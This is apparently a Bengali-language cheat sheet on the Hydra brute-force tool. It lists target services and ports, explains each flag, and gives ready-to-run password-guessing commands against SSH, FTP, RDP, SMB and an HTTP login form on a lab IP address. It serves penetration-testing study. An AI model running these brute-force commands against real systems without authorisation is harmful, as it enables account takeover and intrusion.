# Hydra কি

---

**Hydra**

হলো একটি **network logon brute-force tool.**

এটা দিয়ে বিভিন্ন **protocol login** brute force করা যায়।

## সহজভাবে

---

Hydra = **username + password wordlist দিয়ে login guess করা**

## Hydra কোথায় ব্যবহার হয়

---

Hydra সাধারণত ব্যবহার হয় এইসব সার্ভিসে:

| Service | Port |
| --- | --- |
| SSH | 22 |
| FTP | 21 |
| TELNET | 23 |
| HTTP Login Form | 80/443 |
| SMB | 445 |
| RDP | 3389 |
| MySQL | 3306 |
| PostgreSQL | 5432 |
| VNC | 5900 |
| POP3 | 110 |
| IMAP | 143 |

# Usage

---

### Hydra Basic Syntax

```jsx
hydra [options] [target] [service]

Example:
hydra -l admin -P passwords.txt 192.168.1.10 ssh
```

### Flags

---

```jsx
-l → Single Username
-L → Username Wordlist
-p → Single Password
**-P → Password Wordlist
-s → Custom Port                /default port ছাড়া অন্য port এ attack।
-t → Threads                    /একসাথে কতগুলো request যাবে।
-v → Verbose Mode                /attack চলার সময় details দেখাবে।
-V → Very Verbose                /প্রতিটা login attempt দেখাবে।
-f → Stop When Found              /password পেলেই attack stop করবে।
-F → Stop Per Host                 /multiple host হলে একটার password পেলেই সেই host stop।
-o → Output Save                    /result file এ save করবে।
-e → Extra Password Check 
      -e n   n=empty password
      -e s   s=password=username
      -e r   r=reverse username
 
 -R → Resume Attack                  /attack বন্ধ হলে আবার resume।
 -C → Username:Password Combo List  /combo wordlist use।
 -I → Ignore Restore File          /আগের restore file ignore করবে।
 -M → Multiple Targets            
 -u → Loop User First
 -w → Wait Time                   /attempt এর মাঝে delay।**
 
```

# Service login attacks

---

### SSH

---

```jsx
hydra -l root -P rockyou.txt -t 16 192.168.1.10 ssh
```

FTP

---

```jsx
hydra -l admin -P pass.txt 192.168.1.10 ftp
```

RDP

---

```jsx
hydra -l administrator -P pass.txt 192.168.1.10 rdp
```

### smb

---

```jsx
hydra -l admin -P pass.txt 192.168.1.10 smb
```

### http login form

---

```jsx
hydra -l admin -P pass.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```